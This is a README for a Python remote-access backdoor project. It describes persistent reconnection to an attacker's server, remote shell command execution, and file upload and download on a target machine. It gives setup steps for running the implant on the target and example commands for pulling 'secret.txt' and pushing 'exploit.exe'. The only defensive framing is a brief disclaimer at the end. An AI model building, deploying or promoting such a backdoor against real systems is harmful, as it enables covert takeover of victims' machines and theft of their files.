# Remote Backdoor with File Transfer

## Overview
This project is a Python-based remote backdoor that allows a server to establish a connection with a target machine. It includes features like command execution, directory navigation, and file transfer (upload/download) with integrity verification.

## Features
- **Persistent Connection**: The backdoor attempts to reconnect if the connection is lost.
- **Command Execution**: Allows the server to execute shell commands on the target machine.
- **File Transfer**:
  - Download files from the target machine.
  - Upload files to the target machine.
  - Uses MD5 hash verification to ensure file integrity.
- **Session Management**: Supports multiple command executions per session.

## Installation & Setup
### Prerequisites
- Python 3.x
- Required Python libraries: `socket`, `subprocess`, `time`, `json`, `os`, `pyautogui`, `hashlib`, `termcolor`, `art`

### Install Dependencies
```sh
pip install termcolor art pyautogui
```

### Configuration
- **Modify the `HOST_IP` and `PORT` in both `server.py` and `backdoor.py` as needed.**
- **Ensure the port is open on the server firewall** for proper communication.

### Running the Server
Run the following command on the **server machine**:
```sh
python server.py
```

### Running the Backdoor
Run the following command on the **target machine**:
```sh
python backdoor.py
```

The backdoor will attempt to connect to the server every 10 seconds if the connection fails.

## Usage
### Available Commands
| Command | Description |
|---------|-------------|
| `help` | Displays available commands |
| `:kill` | Terminates the connection |
| `cd <path>` | Changes directory on the target machine |
| `pwd` | Prints the current directory on the target |
| `download <file>` | Downloads a file from the target |
| `upload <file>` | Uploads a file to the target |
| Any shell command | Executes a shell command on the target |

### Example Usage
#### Download a file from the target
```sh
fsociety> download secret.txt
```

#### Upload a file to the target
```sh
fsociety> upload exploit.exe
```

#### Change directory on the target
```sh
fsociety> cd C:\\Users\\User
```

## Troubleshooting
### Lost Connection Issues
- If the connection times out frequently, ensure:
  - The target machine can reach the server (check firewalls and network settings).
  - The port is open and listening on the server.
  - The backdoor script is running on the target.

### File Transfer Fails
- Ensure the file exists on the source machine.
- Check file permissions.
- Verify the MD5 hash to ensure file integrity.

## Disclaimer
This tool is for **educational and authorized security testing purposes only**. Unauthorized use is **illegal** and punishable by law. The author is **not responsible** for any misuse of this tool.

